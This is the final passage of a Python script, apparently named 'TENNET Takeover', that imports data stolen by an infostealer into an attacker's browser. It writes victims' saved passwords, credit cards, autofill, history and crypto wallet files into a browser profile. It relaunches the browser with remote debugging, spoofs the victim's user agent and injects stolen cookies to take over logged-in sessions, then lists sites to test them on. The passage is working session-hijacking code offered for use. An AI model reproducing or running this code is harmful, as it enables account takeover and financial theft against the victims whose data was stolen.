            print(f"  ... and {len(passwords) - 20} more")
        print()

    user_data = resolve_user_data(browser, use_real_profile)
    if not use_real_profile:
        profile = 'Default'
        print(f"  [i] Import profile: {user_data}")

    print(f"  [*] Killing {browser}...")
    kill_browser(browser)

    print(f"  [*] Preparing browser profile...")
    bootstrap_profile(browser, user_data, profile)

    if not HAS_CRYPTO:
        print("  [!] pip install pycryptodome pywin32 — passwords/cards cannot be encrypted without these")

    print(f"  [*] Writing profile data (passwords, cards, autofill, bookmarks, history, wallets)...")
    profile_stats = ProfileImporter(user_data, profile).import_all(payload)
    print(f"  [+] Passwords:       {profile_stats['passwords']}")
    print(f"  [+] Credit cards:    {profile_stats['cards']}")
    print(f"  [+] Autofill:        {profile_stats['autofill']}")
    print(f"  [+] Bookmarks:       {profile_stats['bookmarks']}")
    print(f"  [+] History:         {profile_stats['history']}")
    print(f"  [+] Wallet files:    {profile_stats['wallets']}")
    print(f"  [+] Desktop wallets: {profile_stats['desktop_wallets']}")

    print(f"  [*] Launching {browser} with debugging (port {port})...")
    launched, launch_msg = launch_browser(browser, profile, port, user_data)
    if not launched:
        print(f"  [!] Failed to launch {browser}: {launch_msg}")
        sys.exit(1)
    print(f"  [+] {launch_msg}")

    if not cookies:
        print(f"\n  ╔══════════════════════════════════════════╗")
        print(f"  ║         ✅  PROFILE IMPORT DONE          ║")
        print(f"  ║  No cookies in zip — open browser and    ║")
        print(f"  ║  check passwords/bookmarks/history.      ║")
        print(f"  ╚══════════════════════════════════════════╝")
        return

    print(f"  [*] Connecting to CDP...")
    try:
        ws = connect_cdp(port)
    except Exception as e:
        print(f"  [!] CDP failed: {e}")
        sys.exit(1)

    cdp_send(ws, 'Network.enable')

    user_agents = payload['user_agents']
    victim_ua = None
    for key in user_agents:
        if any(b in key for b in [browser, 'chrome']):
            victim_ua = user_agents[key]
            break
    if not victim_ua and user_agents:
        victim_ua = next(iter(user_agents.values()))

    if victim_ua:
        cdp_send(ws, 'Network.setUserAgentOverride', {
            'userAgent': victim_ua,
            'acceptLanguage': 'en-US,en;q=0.9',
            'platform': 'Win32',
        })
        print(f"  [+] UA spoofed")

    print(f"  [*] Injecting {len(cookies)} cookies...")
    ok = 0
    fail = 0
    errors = {}
    for i, cookie in enumerate(cookies):
        success, err = inject_cookie(ws, cookie, cmd_id=1000 + i)
        if success:
            ok += 1
        else:
            fail += 1
            key = err or 'unknown'
            errors[key] = errors.get(key, 0) + 1
            if verbose and fail <= 10:
                label = cookie.get('domain') or cookie.get('host', '?')
                print(f"  [!] {label} / {cookie.get('name', '?')}: {err}")

    print(f"  [+] Imported: {ok}")
    if fail:
        print(f"  [!] Failed:   {fail}")
        if not verbose and errors:
            top = sorted(errors.items(), key=lambda x: -x[1])[:3]
            print(f"  [!] Top errors: {', '.join(f'{k} ({v})' for k, v in top)}")
            print(f"  [!] Re-run with -v to see per-cookie failures")

    print(f"  [*] Opening import summary in browser...")
    try:
        domains = open_landing_page(ws, cookies, ok, fail, profile_stats)
    except Exception as e:
        domains = top_domains(cookies)
        print(f"  [!] Could not open landing page: {e}")

    if domains:
        print(f"  [i] Test cookie sessions:")
        for name, count in domains[:6]:
            print(f"      https://{name}/  ({count} cookies)")

    print(f"\n  ╔══════════════════════════════════════════╗")
    print(f"  ║              ✅  DONE                    ║")
    print(f"  ║  Cookies: {ok:<6} Passwords: {profile_stats['passwords']:<4}      ║")
    print(f"  ║  Cards:   {profile_stats['cards']:<6} Bookmarks: {profile_stats['bookmarks']:<4}      ║")
    print(f"  ║  Browser open — test sessions & settings ║")
    print(f"  ╚══════════════════════════════════════════╝")
    print(f"\n  [i] Leave this terminal open; close the browser when finished.")

    try:
        ws.close()
    except Exception:
        pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n  [*] Interrupted")
    except Exception as exc:
        print(f"\n  [!] Error: {exc}")
        if getattr(sys, 'frozen', False) and not stdin_available():
            show_message('TENNET Takeover', str(exc), kind='error')
            sys.exit(1)
        raise
    finally:
        pause_if_gui()